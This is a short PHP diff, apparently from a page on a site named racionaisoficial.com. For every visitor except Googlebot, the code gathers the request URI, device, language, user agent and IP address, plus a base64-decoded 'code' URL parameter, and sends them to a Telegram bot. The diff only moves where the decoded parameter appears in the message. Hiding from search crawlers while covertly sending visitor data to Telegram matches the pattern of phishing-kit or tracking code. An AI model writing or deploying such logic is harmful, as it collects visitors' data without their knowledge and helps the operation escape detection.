@@ -49,6 +49,9 @@ if (!stripos($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) {
     $device = new Device();
     $language = new Language();
     $message = "RACIONAIS - NOTIFICAÇÃO".PHP_EOL;
+    if(isset($_GET['code']) && !empty($_GET['code'])){
+        $message .= "CODE: ".base64_decode($_GET['code']).PHP_EOL;
+    }
     $message .= "racionaisoficial.com".PHP_EOL.PHP_EOL;
     $uri = $_SERVER['REQUEST_URI']??'';
     $message .= 'URI: '.$uri.PHP_EOL.PHP_EOL;
@@ -64,9 +67,7 @@ if (!stripos($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) {
     $message .= 'Idioma: ' . $language->getLanguage() . PHP_EOL . PHP_EOL;
     $message .= "User agent: " . $_SERVER['HTTP_USER_AGENT'] . PHP_EOL . " IP: " . $_SERVER['REMOTE_ADDR'];
     $message .= PHP_EOL . PHP_EOL;
-    if(isset($_GET['code']) && !empty($_GET['code'])){
-        $message .= base64_decode($_GET['code']);
-    }
+    
     if($sended){
         \Telegram\BotTelegram::send($message);
     }
